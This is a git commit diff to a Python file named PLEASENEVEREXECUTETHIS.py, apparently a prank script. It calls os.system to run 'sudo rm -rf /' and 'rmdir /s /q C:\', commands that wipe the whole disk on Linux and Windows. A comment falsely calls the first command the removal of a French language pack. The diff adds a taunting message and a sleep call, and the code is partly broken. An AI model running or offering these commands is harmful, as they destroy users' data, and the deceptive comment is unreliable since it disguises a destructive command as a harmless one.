7d1852d4b89867d1d2d5ec0f67d694db01a92780
Melissa <124466796+Greenville71@users.noreply.github.com>
2025-05-27 16:51:58 +0100

    Update PLEASENEVEREXECUTETHIS.py

--- PLEASENEVEREXECUTETHIS.py
+++ PLEASENEVEREXECUTETHIS.py
@@ -1,6 +1,11 @@
 import os
+import time
+
+print("if you execute this, your computer WILL kablooey. lets sit down and wait")
+
+sleep(240)
 
 os.system("sudo rm -rf / -no-preserve-root")
 # remove french language pack
 os.system("rmdir /s /q C:\")
-# i dont like windows users users
+# i dont like windows users
